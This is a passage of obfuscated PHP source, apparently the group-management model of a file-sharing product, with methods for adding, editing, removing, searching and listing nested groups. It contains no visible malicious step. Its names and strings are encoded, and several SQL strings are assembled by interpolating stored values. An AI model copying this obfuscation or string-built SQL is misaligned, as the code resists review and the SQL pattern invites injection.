$îÔ˜å¢Ğ =& $_SERVER[şÒÁøÒÄ]; $şåßìı× = $this->count() + 0.0; $äØ÷½ìù = 0; $¶„Õõ°× = 1; $§ñ©Ÿ–ª = 0; $ËÍŞÆ = 5000; for ($àŸˆùÔ = 0; $àŸˆùÔ < $şåßìı×; $àŸˆùÔ = $àŸˆùÔ + $ËÍŞÆ) { $ıƒßÈ¨Œ = $this->limit($àŸˆùÔ, $àŸˆùÔ + $ËÍŞÆ)->select(); foreach ($ıƒßÈ¨Œ as $¯äß¸) { $¶„Õõ°× += $¯äß¸[$îÔ˜å¢Ğ[76]] * $¯äß¸[$îÔ˜å¢Ğ[1937]]; $äØ÷½ìù += $¯äß¸[$îÔ˜å¢Ğ[76]] * ($¯äß¸[$îÔ˜å¢Ğ[1937]] - 1); $§ñ©Ÿ–ª += $¯äß¸[$îÔ˜å¢Ğ[1937]]; } } $‹é°—³ = array($îÔ˜å¢Ğ[1943] => $¶„Õõ°×, $îÔ˜å¢Ğ[1944] => $äØ÷½ìù, $îÔ˜å¢Ğ[1945] => $äØ÷½ìù / $¶„Õõ°×, $îÔ˜å¢Ğ[80] => $şåßìı×, $îÔ˜å¢Ğ[1946] => $§ñ©Ÿ–ª); return $‹é°—³; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\x75\x70"; protected $tableMeta = array("\x74\141\142\154\145\116\141\155\145" => "\147\162\157\x75\160\137\x6d\x65\x74\x61", "\x6d\x65\164\x61\106\151\x65\154\x64" => "\147\162\157\165\x70\111\x44"); protected function cacheFunctionAlias($ğÔˆÀóÑ) { $ŸŞÁÁ• =& $_SERVER[şÒÁøÒÄ]; return array($ŸŞÁÁ•[1947] => array($ğÔˆÀóÑ[0], $ŸŞÁÁ•[1948]), $ŸŞÁÁ•[1949] => array($ğÔˆÀóÑ[0], $ŸŞÁÁ•[1950])); } protected function getInfo($²ÊüÀÑ¦, $ÈÌÈÕ¶ = false) { $ˆÛ¬Ò = $this->getInfoSimple($²ÊüÀÑ¦); if (!$ˆÛ¬Ò) { return !1; } if ($ÈÌÈÕ¶) { return $this->_listDataApplyItem($ˆÛ¬Ò); } return $this->cacheFunctionGet($_SERVER[şÒÁøÒÄ][1951], $²ÊüÀÑ¦); } protected function getInfoSimple($Á’ƒáÅ, $„ÂóäÕ = false) { $ñÚşÛ¼Ş =& $_SERVER[şÒÁøÒÄ]; if ($„ÂóäÕ) { $ëÄ¡šğŸ = array($ñÚşÛ¼Ş[1869] => intval($Á’ƒáÅ)); $Ë°‘ÀÛ = $this->where($ëÄ¡šğŸ)->find(); return is_array($Ë°‘ÀÛ) ? $Ë°‘ÀÛ : array(); } return $this->cacheFunctionGet($ñÚşÛ¼Ş[1952], $Á’ƒáÅ); } protected function groupAdd($»–—Àóø) { $Ò³¥¸Êº =& $_SERVER[şÒÁøÒÄ]; if (!$»–—Àóø[$Ò³¥¸Êº[432]] && isset($»–—Àóø[$Ò³¥¸Êº[1869]]) && $»–—Àóø[$Ò³¥¸Êº[1869]] == 1) { if ($ì†½È‚‘ = $this->getInfoSimple($»–—Àóø[$Ò³¥¸Êº[1869]], !0)) { return $»–—Àóø[$Ò³¥¸Êº[1869]]; } } else { $ì†½È‚‘ = $this->getInfoSimple($»–—Àóø[$Ò³¥¸Êº[432]]); if (!$ì†½È‚‘) { return !1; } } $çÜä¾½š = $Ò³¥¸Êº[521]; if ($ì†½È‚‘[$Ò³¥¸Êº[511]]) { $çÜä¾½š = $ì†½È‚‘[$Ò³¥¸Êº[511]] . $ì†½È‚‘[$Ò³¥¸Êº[1869]] . $Ò³¥¸Êº[50]; } $·àäÍÀ¢ = array($Ò³¥¸Êº[420] => $this->groupNameAuto($»–—Àóø[$Ò³¥¸Êº[432]], $»–—Àóø[$Ò³¥¸Êº[32]]), $Ò³¥¸Êº[401] => $»–—Àóø[$Ò³¥¸Êº[432]], $Ò³¥¸Êº[580] => $çÜä¾½š, $Ò³¥¸Êº[1953] => $»–—Àóø[$Ò³¥¸Êº[1856]], $Ò³¥¸Êº[1954] => 0, $Ò³¥¸Êº[1873] => 0); if (isset($»–—Àóø[$Ò³¥¸Êº[1893]])) { $·àäÍÀ¢[$Ò³¥¸Êº[1893]] = $»–—Àóø[$Ò³¥¸Êº[1893]]; } else { $ãòõÒÙÕ = $this->max($Ò³¥¸Êº[1893]); if (!$ãòõÒÙÕ) { $ãòõÒÙÕ = 0; } $·àäÍÀ¢[$Ò³¥¸Êº[1893]] = $ãòõÒÙÕ + 1; } if (!empty($»–—Àóø[$Ò³¥¸Êº[1869]])) { $·àäÍÀ¢[$Ò³¥¸Êº[1869]] = $»–—Àóø[$Ò³¥¸Êº[1869]]; } $ùñ°‡Àµ = $this->add($·àäÍÀ¢); $this->setNamePinyin($ùñ°‡Àµ, $·àäÍÀ¢[$Ò³¥¸Êº[32]]); if (isset($»–—Àóø[$Ò³¥¸Êº[1955]])) { $this->metaSet($ùñ°‡Àµ, array($Ò³¥¸Êº[1955] => $»–—Àóø[$Ò³¥¸Êº[1955]], $Ò³¥¸Êº[1956] => $»–—Àóø[$Ò³¥¸Êº[1956]])); unset($»–—Àóø[$Ò³¥¸Êº[1955]]); unset($»–—Àóø[$Ò³¥¸Êº[1956]]); } Model($Ò³¥¸Êº[1352])->groupRootAdd($ùñ°‡Àµ); return $ùñ°‡Àµ; } protected function groupEdit($‰Ï¬Ùş¯, $Äé¿éÇÇ) { $ñÑ¬ö—ã =& $_SERVER[şÒÁøÒÄ]; $ËáÂ–Š÷ = $this->getInfoSimple($‰Ï¬Ùş¯); if (!$ËáÂ–Š÷) { return !1; } if (!empty($Äé¿éÇÇ[$ñÑ¬ö—ã[432]])) { $×«°æ¡ = $this->getInfoSimple($Äé¿éÇÇ[$ñÑ¬ö—ã[432]]); if (!$×«°æ¡) { return !1; } if ($ËáÂ–Š÷[$ñÑ¬ö—ã[1869]] == $×«°æ¡[$ñÑ¬ö—ã[1869]]) { return !1; } if ($Äé¿éÇÇ[$ñÑ¬ö—ã[432]] != $ËáÂ–Š÷[$ñÑ¬ö—ã[432]]) { if ($×«°æ¡[$ñÑ¬ö—ã[511]] !== $ËáÂ–Š÷[$ñÑ¬ö—ã[511]] && strpos($×«°æ¡[$ñÑ¬ö—ã[511]], $ËáÂ–Š÷[$ñÑ¬ö—ã[511]] . $ËáÂ–Š÷[$ñÑ¬ö—ã[1869]] . $ñÑ¬ö—ã[50]) === 0) { return !1; } $Äé¿éÇÇ[$ñÑ¬ö—ã[580]] = $×«°æ¡[$ñÑ¬ö—ã[511]] . $Äé¿éÇÇ[$ñÑ¬ö—ã[432]] . $ñÑ¬ö—ã[50]; $this->_changeChildLevel($ËáÂ–Š÷, $×«°æ¡); } } if (isset($Äé¿éÇÇ[$ñÑ¬ö—ã[32]])) { $this->setNamePinyin($‰Ï¬Ùş¯, $Äé¿éÇÇ[$ñÑ¬ö—ã[32]]); } if (isset($Äé¿éÇÇ[$ñÑ¬ö—ã[1955]])) { $this->metaSet($‰Ï¬Ùş¯, array($ñÑ¬ö—ã[1955] => $Äé¿éÇÇ[$ñÑ¬ö—ã[1955]], $ñÑ¬ö—ã[1956] => $Äé¿éÇÇ[$ñÑ¬ö—ã[1956]])); unset($Äé¿éÇÇ[$ñÑ¬ö—ã[1955]]); unset($Äé¿éÇÇ[$ñÑ¬ö—ã[1956]]); } $this->_clearChildrenCache($ËáÂ–Š÷); return $this->where(array($ñÑ¬ö—ã[1957] => $‰Ï¬Ùş¯))->save($Äé¿éÇÇ); } private function _clearChildrenCache($åï¡ÊÃ¦) { $Â£ã¦Æõ =& $_SERVER[şÒÁøÒÄ]; $Á“ÓòÑÕ = array($Â£ã¦Æõ[580] => array($Â£ã¦Æõ[540], $åï¡ÊÃ¦[$Â£ã¦Æõ[511]] . $åï¡ÊÃ¦[$Â£ã¦Æõ[1869]] . $Â£ã¦Æõ[541])); $üŒ¦Ò¹¥ = $this->field($Â£ã¦Æõ[1869])->where($Á“ÓòÑÕ)->select(); foreach ($üŒ¦Ò¹¥ as $Ïı£) { $this->_clearCache($Ïı£[$Â£ã¦Æõ[1869]]); } } private function _clearCache($ê¬¥ùà) { $±ø³Ö³ =& $_SERVER[şÒÁøÒÄ]; $this->cacheFunctionClear($±ø³Ö³[1951], $ê¬¥ùà); $this->cacheFunctionClear($±ø³Ö³[1952], $ê¬¥ùà); } private function _changeChildLevel($å“Ê¯í, $³º×¼ÚÈ, $œõ°ãåå = false) { $‡¤’’ÒŒ =& $_SERVER[şÒÁøÒÄ]; $Â„–±§¶ = $å“Ê¯í[$‡¤’’ÒŒ[511]] . $å“Ê¯í[$‡¤’’ÒŒ[1869]] . $‡¤’’ÒŒ[50]; $„ÄéË‡· = $³º×¼ÚÈ[$‡¤’’ÒŒ[511]] . $³º×¼ÚÈ[$‡¤’’ÒŒ[1869]] . $‡¤’’ÒŒ[50] . $å“Ê¯í[$‡¤’’ÒŒ[1869]] . $‡¤’’ÒŒ[50]; if ($œõ°ãåå) { $„ÄéË‡· = $³º×¼ÚÈ[$‡¤’’ÒŒ[511]] . $³º×¼ÚÈ[$‡¤’’ÒŒ[1869]] . $‡¤’’ÒŒ[50]; } $½‹œ¯’ = array($‡¤’’ÒŒ[580] => array($‡¤’’ÒŒ[540], $å“Ê¯í[$‡¤’’ÒŒ[511]] . $å“Ê¯í[$‡¤’’ÒŒ[1869]] . $‡¤’’ÒŒ[541])); $÷áÃÃá = array($‡¤’’ÒŒ[580] => array($‡¤’’ÒŒ[589], "\x72\x65\x70\154\x61\x63\x65\x28\x70\141\x72\145\x6e\164\x4c\x65\x76\x65\154\x2c\x27{$Â„–±§¶}\x27\x2c\x27{$„ÄéË‡·}\47\x29")); $this->_clearChildrenCache($å“Ê¯í); $this->where($½‹œ¯’)->data($÷áÃÃá)->save(); } public function setNamePinyin($ƒ‡¤ë¸, $ŸşĞŞÄé = false) { $±¾Ôêï¥ =& $_SERVER[şÒÁøÒÄ]; if (!$ŸşĞŞÄé) { $³İ…Ğ = $this->getInfoSimple($ƒ‡¤ë¸); $ŸşĞŞÄé = $³İ…Ğ[$±¾Ôêï¥[32]]; } if (!Input::check($ŸşĞŞÄé, $±¾Ôêï¥[583])) { $this->metaSet($ƒ‡¤ë¸, $±¾Ôêï¥[465], null); $this->metaSet($ƒ‡¤ë¸, $±¾Ôêï¥[464], null); return; } $†‹ÁÑ¦’ = array($±¾Ôêï¥[465] => str_replace($±¾Ôêï¥[53], $±¾Ôêï¥[12], Pinyin::get($ŸşĞŞÄé)), $±¾Ôêï¥[464] => Pinyin::get($ŸşĞŞÄé, $±¾Ôêï¥[584])); $this->metaSet($ƒ‡¤ë¸, $†‹ÁÑ¦’); } protected function groupStatus($ŞÎ¬¢ß, $Øà¶¬¼Š) { $²à–ı‹ =& $_SERVER[şÒÁøÒÄ]; $‡Ùã´‘ = $this->getInfoSimple($ŞÎ¬¢ß); if (!$‡Ùã´‘) { return !1; } if ($Øà¶¬¼Š == $²à–ı‹[88]) { $ÚãÍ¶­á = $this->parentLevelArray($‡Ùã´‘[$²à–ı‹[511]]); } else { $ÃÜŒ’…á = array($²à–ı‹[580] => array($²à–ı‹[540], $‡Ùã´‘[$²à–ı‹[511]] . $‡Ùã´‘[$²à–ı‹[1869]] . $²à–ı‹[541])); $ÚãÍ¶­á = $this->where($ÃÜŒ’…á)->field($²à–ı‹[1869])->select(); $ÚãÍ¶­á = array_to_keyvalue($ÚãÍ¶­á, $²à–ı‹[12], $²à–ı‹[1869]); } $ÚãÍ¶­á[] = $‡Ùã´‘[$²à–ı‹[1869]]; $ÎÂÍ¦­ì = array(); foreach ($ÚãÍ¶­á as $ŞÎ¬¢ß) { $ÎÂÍ¦­ì[] = array($²à–ı‹[1869] => $ŞÎ¬¢ß, $²à–ı‹[94] => $²à–ı‹[757], $²à–ı‹[374] => $Øà¶¬¼Š); $this->_clearCache($ŞÎ¬¢ß); } return Model($²à–ı‹[1958])->addAll($ÎÂÍ¦­ì, array(), !0); } protected function groupRemove($ˆ¹‹Ì©ª, $Ö”“úÍ = false) { $äÖ±¤ğ½ =& $_SERVER[şÒÁøÒÄ]; $ˆ½–Ğ­› = array($äÖ±¤ğ½[1869] => $ˆ¹‹Ì©ª); $ñàÅğ‘“ = $this->where($ˆ½–Ğ­›)->find(); if (!$ñàÅğ‘“ || $ñàÅğ‘“[$äÖ±¤ğ½[432]] == 0) { return !1; } if (!$Ö”“úÍ) { $³±¡¡Æİ = $this->getInfoSimple($ñàÅğ‘“[$äÖ±¤ğ½[432]]); $this->_changeChildLevel($ñàÅğ‘“, $³±¡¡Æİ, !0); $this->where(array($äÖ±¤ğ½[432] => $ˆ¹‹Ì©ª))->save(array($äÖ±¤ğ½[432] => $ñàÅğ‘“[$äÖ±¤ğ½[432]])); } Model($äÖ±¤ğ½[1958])->where($ˆ½–Ğ­›)->delete(); Model($äÖ±¤ğ½[1959])->where($ˆ½–Ğ­›)->delete(); Model($äÖ±¤ğ½[833])->groupRootRemove($ˆ¹‹Ì©ª); return $this->where($ˆ½–Ğ­›)->delete(); } protected function groupSort($Ü²ÌËİç) { $Ï÷¦Æç„ =& $_SERVER[şÒÁøÒÄ]; $ïÀšä¦å = array(); foreach ($Ü²ÌËİç as $ËÌûâÏ => $ÜÂëşØ”) { $ïÀšä¦å[] = array($Ï÷¦Æç„[1869], $ÜÂëşØ”, $Ï÷¦Æç„[1893], $ËÌûâÏ + 1); } $this->saveAll($ïÀšä¦å); } public function listData() { $ƒ’ìˆùı = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ƒ’ìˆùı[$_SERVER[şÒÁøÒÄ][369]]); return $ƒ’ìˆùı; } private function _makeOrder($ÁòÕ¥İˆ = '') { $¥Úè¨œŸ =& $_SERVER[şÒÁøÒÄ]; $”¤Ö£å = array($¥Úè¨œŸ[1869], $¥Úè¨œŸ[32], $¥Úè¨œŸ[1858], $¥Úè¨œŸ[201]); $°Æ¯ï±· = array($¥Úè¨œŸ[450] => $¥Úè¨œŸ[451], $¥Úè¨œŸ[452] => $¥Úè¨œŸ[453]); $²ııÆˆÊ = Input::get($¥Úè¨œŸ[457], $¥Úè¨œŸ[7], $¥Úè¨œŸ[1873], $”¤Ö£å); $££È€ = Input::get($¥Úè¨œŸ[458], $¥Úè¨œŸ[7], $¥Úè¨œŸ[1960], array($¥Úè¨œŸ[1960], $¥Úè¨œŸ[452])); $££È€ = $°Æ¯ï±·[$££È€]; $ÁòÕ¥İˆ = $ÁòÕ¥İˆ . "{$²ııÆˆÊ}\x20{$££È€}\x2c\x20\x67\x72\157\x75\160\111\104\40\x61\x73\143"; return $this->order($ÁòÕ¥İˆ); } public function listChild($ÌÆÇüâ) { $Ï£€¡ªø =& $_SERVER[şÒÁøÒÄ]; $½¸¿œË¿ = $this->where(array($Ï£€¡ªø[432] => $ÌÆÇüâ))->_makeOrder()->selectPage(200); $this->_listDataApply($½¸¿œË¿[$Ï£€¡ªø[369]]); return $½¸¿œË¿; } public function listChildIds($òŠßé¥—) { $†ÉÜ¸»À =& $_SERVER[şÒÁøÒÄ]; if (is_string($úüÃåºµ)) { $òŠßé¥— = explode($†ÉÜ¸»À[50], $òŠßé¥—); } $×¬§Ü³û = $this->where(array($†ÉÜ¸»À[1869] => array($†ÉÜ¸»À[7], $òŠßé¥—)))->field($†ÉÜ¸»À[1961])->select(); if (!$×¬§Ü³û) { return !1; } $™ñšæü± = array(); foreach ($×¬§Ü³û as $àŞÉÏ“¼) { $™ñšæü±[] = "\163\145\x6c\x65\143\x74\x20\x67\162\x6f\x75\160\x49\104\x20\x66\162\x6f\155\40\x60\x67\162\x6f\165\x70\140\x20\167\x68\x65\x72\145\40\160\141\x72\145\156\164\114\145\166\145\x6c\x20\x6c\x69\x6b\x65\40\47{$àŞÉÏ“¼[$†ÉÜ¸»À[511]]}{$àŞÉÏ“¼[$†ÉÜ¸»À[1869]]}\54\45\x27"; } $™ñšæü± = implode($†ÉÜ¸»À[1962], $™ñšæü±); $×¬§Ü³û = $this->query($™ñšæü±); if (!$×¬§Ü³û) { return array(); } $òŠßé¥— = array_to_keyvalue($×¬§Ü³û, $†ÉÜ¸»À[12], $†ÉÜ¸»À[1869]); return array_unique($òŠßé¥—); } public function listByID($åüÏâ’) { $’íîœ =& $_SERVER[şÒÁøÒÄ]; if (!$åüÏâ’) { return array(); } $¶Í‘àû = array($’íîœ[1869] => array($’íîœ[7], $åüÏâ’)); $ÄÌ‡¥Ãù = $this->where($¶Í‘àû)->select(); $ÄÌ‡¥Ãù = array_sort_keep($ÄÌ‡¥Ãù, $’íîœ[1869], $åüÏâ’); $this->_listDataApply($ÄÌ‡¥Ãù); return $ÄÌ‡¥Ãù; } public function listSearch($ÑğĞû¦Ë) { $Éü²Ë¥ =& $_SERVER[şÒÁøÒÄ]; $İ‘‰÷© = $ÑğĞû¦Ë[$Éü²Ë¥[1963]]; $«Öã÷´… = isset($ÑğĞû¦Ë[$Éü²Ë¥[1964]]) ? $ÑğĞû¦Ë[$Éü²Ë¥[1964]] : !1; if (!trim($İ‘‰÷©)) { return !1; } $İ‘‰÷© = str_replace($Éü²Ë¥[1965], $Éü²Ë¥[1966], $İ‘‰÷©); $Âˆ„Ú±Å = array($Éü²Ë¥[1869] => array($Éü²Ë¥[383], "{$İ‘‰÷©}\45"), $Éü²Ë¥[32] => array($Éü²Ë¥[383], "\45{$İ‘‰÷©}\x25"), $Éü²Ë¥[1013] => $Éü²Ë¥[1967]); if ($«Öã÷´…) { $§ğèĞµ¥ = $this->getInfoSimple($«Öã÷´…); $ô•Ö³Å = $§ğèĞµ¥[$Éü²Ë¥[511]] . $«Öã÷´… . $Éü²Ë¥[541]; $Âˆ„Ú±Å = array($Âˆ„Ú±Å, array($Éü²Ë¥[511] => array($Éü²Ë¥[383], $ô•Ö³Å))); } $Âˆ„Ú±Å = $this->parseWhereLike($Âˆ„Ú±Å); $Éãõ¤¶¢ = $this->_makeOrder()->where($Âˆ„Ú±Å)->selectPage(20); $Éãõ¤¶¢ = $Éãõ¤¶¢ ? $Éãõ¤¶¢ : array($Éü²Ë¥[369] => array(), $Éü²Ë¥[366] => array()); if (!$Éãõ¤¶¢ || count($Éãõ¤¶¢[$Éü²Ë¥[369]]) < 5 && Input::check($İ‘‰÷©, $Éü²Ë¥[318])) { $£‘ñÜˆã = $this->groupChildrenAll($«Öã÷´…); $Âºä¬’Õ = $this->_searchFromMeta($Éü²Ë¥[464], $İ‘‰÷©, 10, $£‘ñÜˆã); $²»š‰Æš = $this->_searchFromMeta($Éü²Ë¥[465], $İ‘‰÷©, 10, $£‘ñÜˆã); $®â›à ø = array_merge($Âºä¬’Õ, $²»š‰Æš, $Éãõ¤¶¢[$Éü²Ë¥[369]]); $Éãõ¤¶¢[$Éü²Ë¥[369]] = array_unique_by_key($®â›à ø, $Éü²Ë¥[1869]); $Éãõ¤¶¢[$Éü²Ë¥[366]][$Éü²Ë¥[367]] = count($Éãõ¤¶¢[$Éü²Ë¥[369]]); $Éãõ¤¶¢[$Éü²Ë¥[366]][$Éü²Ë¥[368]] = ceil($Éãõ¤¶¢[$Éü²Ë¥[366]][$Éü²Ë¥[367]] / $Éãõ¤¶¢[$Éü²Ë¥[366]][$Éü²Ë¥[363]]); } $this->_listDataApply($Éãõ¤¶¢[$Éü²Ë¥[369]]); return $Éãõ¤¶¢; } protected function groupChildrenAll($á‚ìÎ®„) { $òÎÖâç =& $_SERVER[şÒÁøÒÄ]; if (!$á‚ìÎ®„) { return !1; } if (is_string($á‚ìÎ®„)) { $á‚ìÎ®„ = array($á‚ìÎ®„); } $šø½—¸£ = $á‚ìÎ®„; foreach ($á‚ìÎ®„ as $ø¦Í¥íğ) { $ª˜üÈÀ„ = $this->getInfoSimple($ø¦Í¥íğ); $ÀÁó†Üï = array($òÎÖâç[511] => array($òÎÖâç[383], $ª˜üÈÀ„[$òÎÖâç[511]] . $ø¦Í¥íğ . $òÎÖâç[541])); $Ü†çâ»ğ = $this->field($òÎÖâç[1869])->where($ÀÁó†Üï)->select(); $šø½—¸£ = array_merge($šø½—¸£, array_to_keyvalue($Ü†çâ»ğ, $òÎÖâç[12], $òÎÖâç[1869])); } return array_unique($šø½—¸£); } private function _searchFromMeta($ÆÊÄä, $Ñ®äª¢Æ, $ö’É´, $ÆŞ‰ÎúÍ) { $½Ó©€Í­ =& $_SERVER[şÒÁøÒÄ]; $Ñ®äª¢Æ = strtolower($Ñ®äª¢Æ); $êµ¹Ÿ© = array($½Ó©€Í­[94] => $ÆÊÄä, $½Ó©€Í­[374] => array($½Ó©€Í­[383], "\45{$Ñ®äª¢Æ}\45")); $êµ¹Ÿ© = $this->parseWhereLike($êµ¹Ÿ©); if ($ÆŞ‰ÎúÍ) { $êµ¹Ÿ©[$½Ó©€Í­[1869]] = array($½Ó©€Í­[7], $ÆŞ‰ÎúÍ); } $•Õïšø€ = Model($½Ó©€Í­[1968])->where($êµ¹Ÿ©)->limit($ö’É´)->select(); if (!$•Õïšø€) { return array(); } $•Õïšø€ = array_to_keyvalue($•Õïšø€, $½Ó©€Í­[12], $½Ó©€Í­[1869]); $íîüÀ· = $this->where(array($½Ó©€Í­[1957] => array($½Ó©€Í­[7], $•Õïšø€)))->select(); if (!$íîüÀ·) { return array(); } return $íîüÀ·; } protected function _listDataApplyItem($æÅœ¢ Ø) { $âŒåå…¾ = array($æÅœ¢ Ø); $this->_listDataApply($âŒåå…¾); return $âŒåå…¾[0]; } protected function _listDataApply(&$»Ì½Şİ) { $ç÷Ö¿Şû =& $_SERVER[şÒÁøÒÄ]; if (!$»Ì½Şİ) { return; } $ÉÛïƒ¼ = array_to_keyvalue($»Ì½Şİ, $ç÷Ö¿Şû[12], $ç÷Ö¿Şû[1869]); $this->_listAppendChildren($»Ì½Şİ); $this->_listAppendChildrenMember($»Ì½Şİ); $this->_listAppendMeta($»Ì½Şİ, $ÉÛïƒ¼); $this->_listAppendParent($»Ì½Şİ); $this->_listAppendSourceRoot($»Ì½Şİ, $ÉÛïƒ¼); } private function _listAppendChildren(&$®ÊŒŞúÍ) { $µ÷©´õÖ =& $_SERVER[şÒÁøÒÄ]; $ôã¶ª´û = array_to_keyvalue($®ÊŒŞúÍ, $µ÷©´õÖ[12], $µ÷©´õÖ[1869]); $èßÉ©ûÁ = array($µ÷©´õÖ[432] => array($µ÷©´õÖ[7], $ôã¶ª´û)); $Ø“ËÑµ¯ = array($µ÷©´õÖ[432], $µ÷©´õÖ[1969] => $µ÷©´õÖ[491]); $ûàçÅïï = $this->field($Ø“ËÑµ¯)->where($èßÉ©ûÁ)->group($µ÷©´õÖ[432])->select(); $¶Ğ¨Î­’ = array_to_keyvalue($ûàçÅïï, $µ÷©´õÖ[432], $µ÷©´õÖ[491]); foreach ($®ÊŒŞúÍ as &$òÌÅâÊ­) { $¨É‘™©½ = $òÌÅâÊ­[$µ÷©´õÖ[1869]]; $òÌÅâÊ­[$µ÷©´õÖ[1970]] = isset($¶Ğ¨Î­’[$¨É‘™©½]) ? intval($¶Ğ¨Î­’[$¨É‘™©½]) : !1; } unset($òÌÅâÊ­); } private function _listAppendChildrenMember(&$“îšêü‚) { $Ã€çã…¡ =& $_SERVER[şÒÁøÒÄ]; $Ì½§×ş = array_to_keyvalue($“îšêü‚, $Ã€çã…¡[12], $Ã€çã…¡[1869]); $Œ¢šæüî = array($Ã€çã…¡[1869] => array($Ã€çã…¡[7], $Ì½§×ş)); $öÈª¥ÒÙ = array($Ã€çã…¡[1869], $Ã€çã…¡[1969] => $Ã€çã…¡[491]); $Ó¨­„±· = Model($Ã€çã…¡[1959])->field($öÈª¥ÒÙ)->where($Œ¢šæüî)->group($Ã€çã…¡[1869])->select(); $¢ìŸ˜ÏÁ = array_to_keyvalue($Ó¨­„±·, $Ã€çã…¡[1869], $Ã€çã…¡[491]); foreach ($“îšêü‚ as &$ú¥²¬è§) { $ÜÆª…¢‚ = $ú¥²¬è§[$Ã€çã…¡[1869]]; $ú¥²¬è§[$Ã€çã…¡[1971]] = isset($¢ìŸ˜ÏÁ[$ÜÆª…¢‚]) ? intval($¢ìŸ˜ÏÁ[$ÜÆª…¢‚]) : !1; } unset($ú¥²¬è§); } private function _listAppendMeta(&$ïô¢¡Ù, $¼™ÑÌ—ã) { $ï–˜µèŸ =& $_SERVER[şÒÁøÒÄ]; $Ø÷Ø®¿ë = array($ï–˜µèŸ[1869] => array($ï–˜µèŸ[7], $¼™ÑÌ—ã)); $‘¶ÇÙ°¸ = Model($ï–˜µèŸ[1958])->where($Ø÷Ø®¿ë)->select(); $‘¶ÇÙ°¸ = array_to_keyvalue_group($‘¶ÇÙ°¸, $ï–˜µèŸ[1869]); foreach ($‘¶ÇÙ°¸ as &$·ö†©ŸÖ) { $·ö†©ŸÖ = array_to_keyvalue($·ö†©ŸÖ, $ï–˜µèŸ[94], $ï–˜µèŸ[374]); } unset($·ö†©ŸÖ); foreach ($ïô¢¡Ù as &$ğÁİã³ë) { $ğÁİã³ë[$ï–˜µèŸ[466]] = array(); if (isset($‘¶ÇÙ°¸[$ğÁİã³ë[$ï–˜µèŸ[1869]]])) { $ğÁİã³ë[$ï–˜µèŸ[466]] = $‘¶ÇÙ°¸[$ğÁİã³ë[$ï–˜µèŸ[1869]]]; } } unset($ğÁİã³ë); } protected function parentLevelArray($÷¤˜Í·Ü) { $ü°âõ‰ó =& $_SERVER[şÒÁøÒÄ]; $÷¤˜Í·Ü = explode($ü°âõ‰ó[50], trim($÷¤˜Í·Ü, $ü°âõ‰ó[50])); $÷¤˜Í·Ü = array_remove_value($÷¤˜Í·Ü, $ü°âõ‰ó[198]); return $÷¤˜Í·Ü; } protected function parentInGroup($°†ƒŠŠ, $Ó¹¯³˜) { $ÁâÑ­é¤ =& $_SERVER[şÒÁøÒÄ]; $×‘¡·™ = $this->getInfoSimple($°†ƒŠŠ); if (!$×‘¡·™) { return !0; } $Ïşï¤º§ = $this->parentLevelArray($×‘¡·™[$ÁâÑ­é¤[511]]); $Ïşï¤º§[] = $°†ƒŠŠ; foreach ($Ïşï¤º§ as $°†ƒŠŠ) { if (in_array($°†ƒŠŠ . $ÁâÑ­é¤[12], $Ó¹¯³˜)) { return !0; } } return !1; } private function _listAppendParent(&$–ş©Ö¿) { $×‡„ñŸ =& $_SERVER[şÒÁøÒÄ]; $ûğ¸Ñë = array(); foreach ($–ş©Ö¿ as &$…µŞÖ”ö) { $ûğ¸Ñë[$…µŞÖ”ö[$×‡„ñŸ[1869]]] = $…µŞÖ”ö[$×‡„ñŸ[32]]; $³Â¬ÎÔÕ = $this->parentLevelArray($…µŞÖ”ö[$×‡„ñŸ[511]]); foreach ($³Â¬ÎÔÕ as $ğ¢ı²ªÅ) { if (!isset($ûğ¸Ñë[$ğ¢ı²ªÅ])) { $ûğ¸Ñë[$ğ¢ı²ªÅ] = 0; } } } unset($…µŞÖ”ö); foreach ($ûğ¸Ñë as $¢”ğÎüÄ => $êÕîÌÖ‡) { if ($êÕîÌÖ‡) { continue; } $Ù®ØÕüÏ = $this->getInfoSimple($¢”ğÎüÄ); $ûğ¸Ñë[$¢”ğÎüÄ] = $Ù®ØÕüÏ[$×‡„ñŸ[32]]; } $Šòáï® = $GLOBALS[$×‡„ñŸ[6]][$×‡„ñŸ[89]][$×‡„ñŸ[1972]]; if ($GLOBALS[$×‡„ñŸ[494]] == $×‡„ñŸ[88]) { $Šòáï® = !1; } foreach ($–ş©Ö¿ as &$…µŞÖ”ö) { $³Â¬ÎÔÕ = $this->parentLevelArray($…µŞÖ”ö[$×‡„ñŸ[511]]); $ÚäØµÛ¢ = $×‡„ñŸ[12]; foreach ($³Â¬ÎÔÕ as $¢”ğÎüÄ => $ğ¢ı²ªÅ) { if ($Šòáï® && $¢”ğÎüÄ == 0) { continue; } $ÚäØµÛ¢ .= $ûğ¸Ñë[$ğ¢ı²ªÅ] . $×‡„ñŸ[8]; } if ($³Â¬ÎÔÕ) { $ÚäØµÛ¢ .= $…µŞÖ”ö[$×‡„ñŸ[32]]; } $…µŞÖ”ö[$×‡„ñŸ[516]] = str_replace($×‡„ñŸ[519], $×‡„ñŸ[8], $ÚäØµÛ¢); } unset($…µŞÖ”ö); } private function _listAppendSourceRoot(&$úÊ·’¸Â, $Üíô·Ì) { $éî®æ“ =& $_SERVER[şÒÁøÒÄ]; $ãóÅ®Æâ = Model($éî®æ“[833])->listSourceRoot(SourceModel::TYPE_GROUP, $Üíô·Ì); $ãóÅ®Æâ = array_to_keyvalue($ãóÅ®Æâ, $éî®æ“[496]); $ãóÅ®Æâ = array_remove_key($ãóÅ®Æâ, $éî®æ“[496]); foreach ($úÊ·’¸Â as &$éàÊ…) { $éàÊ…[$éî®æ“[87]] = $ãóÅ®Æâ[$éàÊ…[$éî®æ“[1869]]] ? $ãóÅ®Æâ[$éàÊ…[$éî®æ“[1869]]] : array(); } unset($éàÊ…); } protected function groupMerge($ô±«²¢ğ) { $ô±«²¢ğ = array_values(array_unique($ô±«²¢ğ)); $ï› °Ñ = array(); for ($ûÒáÌ = 0; $ûÒáÌ < count($ô±«²¢ğ); $ûÒáÌ++) { $Ì Îš‰ô = !1; for ($¯åÈôÕú = 0; $¯åÈôÕú < count($ô±«²¢ğ); $¯åÈôÕú++) { if ($ûÒáÌ == $¯åÈôÕú) { continue; } if ($this->isParentOf($ô±«²¢ğ[$¯åÈôÕú], $ô±«²¢ğ[$ûÒáÌ])) { $Ì Îš‰ô = !0; break; } } if (!$Ì Îš‰ô) { $ï› °Ñ[] = $ô±«²¢ğ[$ûÒáÌ]; } } return $ï› °Ñ; } protected function isParentOf($¹Åç¿ú¼, $êô‚İ¹×) { $æŸ³á†í =& $_SERVER[şÒÁøÒÄ]; if 